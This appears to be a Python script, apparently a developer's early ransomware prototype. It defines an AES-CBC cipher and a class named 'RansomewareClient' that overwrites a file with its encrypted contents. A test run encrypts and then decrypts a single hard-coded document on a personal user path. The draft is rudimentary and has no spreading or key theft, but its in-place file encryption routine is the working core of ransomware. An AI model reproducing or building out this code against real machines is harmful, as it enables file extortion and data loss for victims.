from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os




def pad(data):
    missing = 16 - len(data)%16
    return data + bytes([missing]*missing)

def unpad(data):
    last = data[-1]
    if last>16 or last < 1:
        raise ValueError("bad padding")
    for i in range(len(data) - last,  len(data)):
        if data[i] != last:
            raise ValueError("bad padding")
    return data[:-last]



class AESCipher():
    def __init__(self, key):
        self.key = key
    def encrypt(self, data):
        data = pad(data)
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(data)

    def decrypt(self, blob):
        iv = blob[0:16]
        data = blob[16::]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(data))

class RansomewareClient():
    def __init__ (self, key):
        self.encryptor = AESCipher(key)
    def encrypt_file(self, file_path):
        #read file
        content = self.read_file(file_path)
        #encrypt content
        encrypted_content = self.encryptor.encrypt(content)
        #write cipher to file
        self.write_file(file_path, encrypted_content)


    def decrypt_file(self, file_path):
        content = self.read_file(file_path)
        decrypted_content = self.encryptor.decrypt(content)
        self.write_file(file_path, decrypted_content)


    def read_file(self, path):
        with open(path, 'rb') as file:
            content = file.read()
            return content
    def write_file(self, path, content):
        with open(path, "wb") as encrypted_file:
            encrypted_file.write(content)



if __name__ == "__main__":
   # key = get_random_bytes(32)
    #c = AESCipher(key)
    #enc =c.encrypt(b"hello")
    #c2 = AESCipher(get_random_bytes(32))
    #print(c2.decrypt(enc))
    key = get_random_bytes(32)
    print(key)
    client = RansomewareClient(key=key)
    client.encrypt_file("/Users/omerbanvolgyi/Documents/Temp/omer.rtf")
    client.decrypt_file("/Users/omerbanvolgyi/Documents/Temp/omer.rtf")

